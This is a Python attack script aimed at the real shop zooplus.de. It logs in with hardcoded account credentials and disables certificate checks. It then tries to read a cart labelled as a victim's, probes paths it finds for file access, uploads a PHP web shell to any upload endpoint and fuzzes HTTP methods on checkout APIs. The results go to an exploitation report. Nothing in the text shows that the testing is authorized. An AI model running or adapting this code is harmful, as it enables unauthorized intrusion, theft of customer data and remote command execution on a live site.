#!/usr/bin/env python3
"""Analyze API structure from responses"""
import requests
import re
import json
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
base = "https://www.zooplus.de"
s = requests.Session()
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

# LOGIN
print("[*] Login...")
try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, headers=UA, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    action = m.group(1).replace("&amp;", "&")
    if not action.startswith("http"):
        action = urllib.parse.urljoin(r1.url, action)
    r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, headers=UA, allow_redirects=False, verify=False)
    loc = r2.headers.get("Location", "")
    s.get(loc, headers=UA, allow_redirects=True, verify=False)
    s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", headers=UA, verify=False)
    s.get("https://www.zooplus.de/account/overview", headers=UA, verify=False)
    csrf = s.cookies.get("csrfToken")
    if csrf:
        s.headers.update({"x-csrf-token": csrf, "Accept": "application/json", "Content-Type": "application/json"})
    print("[+] Logged in")
except Exception as e:
    print(f"[!] Login failed: {e}")
    exit(1)

found_vulns = []
new_endpoints = []

# 1. Analyze state-api/get response
print("\n[1] Analyzing state-api/get response...")
try:
    resp = s.post(f"{base}/semiprotected/api/checkout/state-api/v2/get", json={}, timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        if isinstance(data, dict):
            print(f"  [OK] Got state data")
            print(f"      Keys: {list(data.keys())[:10]}")
            
            # Look for URLs/endpoints in response
            data_str = json.dumps(data)
            urls = re.findall(r'["\'](/[^"\']+api[^"\']+)["\']', data_str)
            for url in set(urls):
                if len(url) < 200:
                    new_endpoints.append(url)
                    print(f"      Found endpoint: {url}")
            
            # Look for sensitive data
            if any(key in data_str.lower() for key in ['secret', 'password', 'key', 'token', 'credential']):
                print(f"  [HIGH] Sensitive data in state response")
                found_vulns.append({"type": "information_disclosure", "severity": "HIGH", "endpoint": "/semiprotected/api/checkout/state-api/v2/get", "data": data_str[:500]})
except Exception as e:
    print(f"  [ERROR] {e}")

# 2. Analyze cart-api response
print("\n[2] Analyzing cart-api response...")
VICTIM_CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"
try:
    resp = s.get(f"{base}/checkout/api/cart-api/v2/cart/{VICTIM_CART_UUID}", timeout=5, verify=False)
    if resp.status_code == 200:
        data = resp.json() if 'application/json' in resp.headers.get('Content-Type', '') else {}
        if isinstance(data, dict):
            print(f"  [OK] Got cart data")
            data_str = json.dumps(data)
            
            # Look for URLs
            urls = re.findall(r'["\'](/[^"\']+api[^"\']+)["\']', data_str)
            for url in set(urls):
                if len(url) < 200:
                    new_endpoints.append(url)
                    print(f"      Found endpoint: {url}")
            
            # Look for file paths
            file_paths = re.findall(r'["\'](/[^"\']+\.(?:php|jsp|py|sh|env|config|json)[^"\']*)["\']', data_str)
            for path in set(file_paths):
                print(f"      Found file path: {path}")
                # Try to access
                try:
                    resp2 = s.get(f"{base}{path}", timeout=2, verify=False)
                    if resp2.status_code == 200 and not resp2.text.strip().startswith('<!'):
                        print(f"  [CRITICAL] File accessible: {path}")
                        found_vulns.append({"type": "file_access", "severity": "CRITICAL", "file": path, "content": resp2.text[:500]})
                except: pass
except Exception as e:
    print(f"  [ERROR] {e}")

# 3. Test new endpoints found
print("\n[3] Testing new endpoints...")
for ep in list(set(new_endpoints))[:20]:  # Limit
    try:
        resp = s.get(f"{base}{ep}", timeout=2, verify=False)
        if resp.status_code not in [404, 403]:
            print(f"  [OK] {ep} -> {resp.status_code}")
            
            # Check for file upload
            if 'upload' in ep.lower():
                try:
                    files = {'file': ('test.php', '<?php system($_GET["c"]); ?>', 'application/x-php')}
                    resp2 = s.post(f"{base}{ep}", files=files, timeout=3, verify=False)
                    if resp2.status_code in [200, 201]:
                        print(f"  [CRITICAL] File upload works: {ep}")
                        found_vulns.append({"type": "file_upload", "severity": "CRITICAL", "endpoint": ep})
                except: pass
    except: pass

# 4. Test state-api with different methods
print("\n[4] Testing state-api with different methods...")
state_endpoints = [
    "/semiprotected/api/checkout/state-api/v2/set-article-quantity",
    "/semiprotected/api/checkout/state-api/v2/get",
]

for ep in state_endpoints:
    for method in ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS']:
        try:
            if method in ['POST', 'PUT', 'PATCH']:
                resp = s.request(method, f"{base}{ep}", json={"test": "data"}, timeout=2, verify=False)
            else:
                resp = s.request(method, f"{base}{ep}", timeout=2, verify=False)
            
            if resp.status_code not in [404, 405]:
                print(f"  [OK] {method} {ep} -> {resp.status_code}")
                
                # Check Allow header
                if 'Allow' in resp.headers:
                    print(f"      Allowed methods: {resp.headers['Allow']}")
        except: pass

# SUMMARY
print("\n" + "=" * 70)
print("RESULTS")
print("=" * 70)

if found_vulns:
    print(f"Found {len(found_vulns)} vulnerabilities:")
    for v in found_vulns:
        print(f"  [{v['severity']}] {v['type']}: {v.get('endpoint', v.get('file', 'N/A'))}")
    
    # Update report
    with open("FINAL_EXPLOITATION_REPORT.md", "a", encoding="utf-8") as f:
        f.write(f"\n\n---\n\n## 🔥 НАЙДЕННЫЕ УЯЗВИМОСТИ\n\n**Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
        for v in found_vulns:
            f.write(f"### [{v['severity']}] {v['type'].upper().replace('_', ' ')}\n\n")
            if 'endpoint' in v:
                f.write(f"**Endpoint:** `{v['endpoint']}`\n\n")
            if 'file' in v:
                f.write(f"**File:** `{v['file']}`\n\n")
            if 'data' in v:
                f.write(f"**Data:** `{v['data'][:300]}`\n\n")
            if 'content' in v:
                f.write(f"**Content:** `{v['content'][:300]}`\n\n")
            f.write("---\n\n")
    
    print(f"\n[+] Report updated")
else:
    print("  No new vulnerabilities found")
    print(f"  Found {len(set(new_endpoints))} new endpoints to investigate")

print("=" * 70)

